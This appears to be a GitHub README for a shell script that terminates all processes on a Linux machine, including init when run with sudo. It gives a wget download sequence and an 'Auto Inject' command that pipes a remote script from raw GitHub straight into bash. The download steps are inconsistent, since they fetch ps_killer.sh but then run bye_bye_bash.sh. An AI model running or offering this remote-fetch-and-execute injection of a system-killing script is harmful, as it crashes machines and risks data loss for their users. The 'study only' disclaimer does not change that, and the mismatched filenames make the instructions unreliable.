# Process-Terminator
Simple Script to Terminate All Process

# ⚠->Warning<-⚠
THIS CODE IS FOR STUDY PURPOSES ONLY<br>
DO NOT USE FOR MALICIOUS PURPOSES<br>
I AM NOT RESPONSIBLE FOR POSSIBLE DAMAGE CAUSED BY THIS CODE<br>

# How to Use
## Download
```sh
wget https://raw.githubusercontent.com/ChaoticOfChaos/Process-Terminator/main/ps_killer.sh
chmod +x ./bye_bye_bash.sh
./bye_bye_bash.sh
```

## Auto Inject
```sh
curl https://raw.githubusercontent.com/ChaoticOfChaos/Process-Terminator/main/ps_killer.sh | /bin/bash
```

## Effects
This Code Terminate All Process Possible, If User is Not Sudo, He Only Can Terminate Process Created by He User.<br>
If Executed With Non-Sudo User, Only Terminate All Process From User<br>
If Executed With Sudo User, Terminate All Process, Include Systemd or Init (PID 1) Process Forcing The Computer to Reboot<br>
The Kill-Code is 15 by Default, Who's Terminate With Minimun Risk of Data Corruption, But not 0, So Don't Execute This Code Out Of Studs Ambient.